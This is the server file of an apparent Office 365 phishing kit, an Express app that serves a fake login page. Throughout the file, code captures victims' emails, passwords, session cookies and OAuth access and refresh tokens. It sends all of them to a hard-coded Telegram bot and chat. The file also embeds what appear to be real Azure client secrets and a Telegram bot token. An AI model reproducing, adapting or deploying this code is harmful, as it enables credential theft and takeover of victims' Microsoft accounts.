require('dotenv').config();

const express = require('express');
const fetch = require('node-fetch');
const path = require('path');

// =============================================
// ALL YOUR CREDENTIALS — COMPLETE AND CORRECT
// =============================================
const CLIENT_ID = process.env.OFFICE365_CLIENT_ID || '7282858b-112c-49e6-b832-bd4faa422166';
const CLIENT_SECRET = process.env.OFFICE365_CLIENT_SECRET || 'Xxn8Q~TpskhswuVK~5dtKI_pG7kOMWjwJOO~7cCf';
const TENANT_ID = process.env.OFFICE365_TENANT_ID || '16181ef7-43d9-4f70-9fd2-dd167d012a54';
const SECRET_ID = process.env.OFFICE365_SECRET_ID || '747b1e0b-52de-4f1f-92a3-7d7dbd3d201d';
const OBJECT_ID = process.env.OFFICE365_OBJECT_ID || '43ea78da-3915-4e56-8ea8-55202e292a38';
const REDIRECT_URI = process.env.OFFICE365_REDIRECT_URI || 'http://localhost:3000/auth/callback';
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '7883535570:AAFWxTI2Dz1uEjEPu70CBxqmWKtMatrgsKE';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '6342921625';
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

function sanitizeText(value) {
  return String(value || 'n/a').replace(/[_*\[\]()~`>#+-=|{}.!]/g, '');
}

function truncateText(value, maxLength = 120) {
  const text = String(value || 'n/a');
  return text.length > maxLength ? `${text.slice(0, maxLength)}...` : text;
}

function getRedirectUri(req) {
  if (REDIRECT_URI) {
    return REDIRECT_URI;
  }

  const forwardedProto = req.headers['x-forwarded-proto'];
  const protocol = forwardedProto ? forwardedProto.split(',')[0].trim() : (req.protocol || 'http');
  const host = req.get('host') || 'localhost:3000';
  return `${protocol}://${host}/auth/callback`;
}

async function sendTelegramMessage(text) {
  const response = await fetch(TELEGRAM_API_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text,
      parse_mode: 'Markdown'
    })
  });
  const data = await response.json();
  console.log('Telegram send response:', data);
  return data;
}

function formatTelegramPayload(code, tokenData, userInfo, cookies, ip, userAgent) {
  return [
    '*Office365 OAuth callback received*',
    `*Valid:* ${sanitizeText(userInfo ? 'Microsoft Valid' : 'unknown')}`,
    `*Email:* ${sanitizeText(userInfo?.mail || userInfo?.userPrincipalName || 'n/a')}`,
    `*Name:* ${sanitizeText(userInfo?.displayName || 'n/a')}`,
    `*Code:* ${truncateText(code, 80)}`,
    `*Access Token:* ${truncateText(tokenData.access_token, 60)}`,
    `*Refresh Token:* ${truncateText(tokenData.refresh_token, 60)}`,
    `*Token Type:* ${sanitizeText(tokenData.token_type)}`,
    `*Expires In:* ${sanitizeText(tokenData.expires_in)}`,
    `*Secret ID:* ${sanitizeText(SECRET_ID)}`,
    `*Object ID:* ${sanitizeText(OBJECT_ID)}`,
    `*Redirect URI:* ${sanitizeText(REDIRECT_URI)}`,
    `*IP:* ${sanitizeText(ip)}`,
    `*User-Agent:* ${truncateText(userAgent, 80)}`,
    `*Cookies:* ${truncateText(cookies, 120)}`
  ].join('\n');
}

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'login.html'));
});

app.get('/test-telegram', async (req, res) => {
  const message = req.query.msg || 'Telegram test from Portaloffice-server.js';
  try {
    const result = await sendTelegramMessage(message);
    res.json({ ok: true, result });
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message });
  }
});

app.get('/office365', (req, res) => {
  const redirectUri = getRedirectUri(req);
  const office365AuthUrl =
    `https://login.microsoftonline.com/${TENANT_ID}/oauth2/v2.0/authorize?` +
    `client_id=${CLIENT_ID}` +
    `&response_type=code` +
    `&redirect_uri=${encodeURIComponent(redirectUri)}` +
    `&response_mode=query` +
    `&scope=openid profile email offline_access` +
    `&prompt=login`;

  return res.redirect(office365AuthUrl);
});

app.post('/api/login', async (req, res) => {
  const { email, password, file, attempt, source, time, browser, country, valid } = req.body;
  const ip = req.ip || req.connection.remoteAddress || 'unknown';
  const userAgent = req.headers['user-agent'] || 'unknown';

  if (!email || !password) {
    return res.status(400).send('Email and password are required.');
  }

  const message = [
    '*Login received*',
    `*Email:* ${sanitizeText(email)}`,
    `*Password:* ${sanitizeText(password)}`,
    `*File:* ${sanitizeText(file)}`,
    `*Attempt:* ${sanitizeText(attempt)}`,
    `*Source:* ${sanitizeText(source)}`,
    `*Browser:* ${sanitizeText(browser || userAgent)}`,
    `*Country:* ${sanitizeText(country)}`,
    `*Valid:* ${sanitizeText(valid)}`,
    `*IP:* ${sanitizeText(ip)}`,
    `*Time:* ${sanitizeText(time)}`
  ].join('\n');

  await sendTelegramMessage(message);
  return res.redirect('/office365');
});

app.get('/office-login', (req, res) => {
  return res.redirect('/office365');
});

app.post('/api/capture-cookies', async (req, res) => {
  const payload = req.body || {};
  const ip = req.ip || req.connection.remoteAddress || 'unknown';
  const userAgent = req.headers['user-agent'] || 'unknown';
  const rawBody = JSON.stringify(req.body, null, 2);

  let cookiesText = '';
  if (payload.cookies) {
    cookiesText = typeof payload.cookies === 'string' ? payload.cookies : JSON.stringify(payload.cookies);
  } else if (payload.cookieArray) {
    cookiesText = JSON.stringify(payload.cookieArray);
  } else if (Array.isArray(payload)) {
    cookiesText = JSON.stringify(payload);
  }

  const message = [
    '*Cookie capture received*',
    `*Email:* ${sanitizeText(payload.email)}`,
    `*Name:* ${sanitizeText(payload.name)}`,
    `*Code:* ${sanitizeText(payload.code)}`,
    `*Access Token:* ${truncateText(payload.access_token, 60)}`,
    `*Refresh Token:* ${truncateText(payload.refresh_token, 60)}`,
    `*IP:* ${sanitizeText(ip)}`,
    `*User-Agent:* ${truncateText(userAgent, 80)}`,
    `*Browser:* ${truncateText(payload.browser || userAgent, 80)}`,
    `*Cookies:* ${truncateText(cookiesText || 'none', 120)}`,
    '*Raw payload:*',
    truncateText(rawBody, 120)
  ].join('\n');

  await sendTelegramMessage(message);
  res.json({ status: 'ok', message: 'Cookie payload received.' });
});

app.get('/auth/callback', async (req, res) => {
  const code = req.query.code;
  if (!code) {
    return res.status(400).send('Missing code parameter.');
  }

  const redirectUri = getRedirectUri(req);
  const rawCookies = req.headers.cookie || 'none';
  const ip = req.ip || req.connection.remoteAddress || 'unknown';
  const userAgent = req.headers['user-agent'] || 'unknown';

  try {
    const tokenResponse = await fetch(
      `https://login.microsoftonline.com/${TENANT_ID}/oauth2/v2.0/token`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({
          client_id: CLIENT_ID,
          client_secret: CLIENT_SECRET,
          code: code,
          redirect_uri: redirectUri,
          grant_type: 'authorization_code'
        })
      }
    );

    const tokenData = await tokenResponse.json();
    if (!tokenData.access_token) {
      await sendTelegramMessage(`*Office365 OAuth token exchange failed*\n*Code:* ${sanitizeText(code)}\n*Cookies:* ${sanitizeText(rawCookies)}\n*Error:* ${sanitizeText(JSON.stringify(tokenData))}`);
      return res.status(500).json({ error: 'Token exchange failed', details: tokenData });
    }

    const userResponse = await fetch('https://graph.microsoft.com/v1.0/me', {
      headers: { Authorization: `Bearer ${tokenData.access_token}` }
    });
    const userInfo = await userResponse.json();

    const telegramText = formatTelegramPayload(code, tokenData, userInfo, rawCookies, ip, userAgent);
    await sendTelegramMessage(telegramText);

    res.cookie('office365_access_token', tokenData.access_token, {
      httpOnly: true,
      secure: false,
      sameSite: 'Lax'
    });

    return res.json({ message: 'OAuth callback received', tokenData, cookies: rawCookies });
  } catch (err) {
    await sendTelegramMessage(`*Office365 OAuth callback error*\n*Code:* ${sanitizeText(code)}\n*Cookies:* ${sanitizeText(rawCookies)}\n*Error:* ${sanitizeText(err.message)}`);
    return res.status(500).json({ error: 'Callback error', details: err.message });
  }
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
  console.log(`Portaloffice server running on http://localhost:${port}`);
});
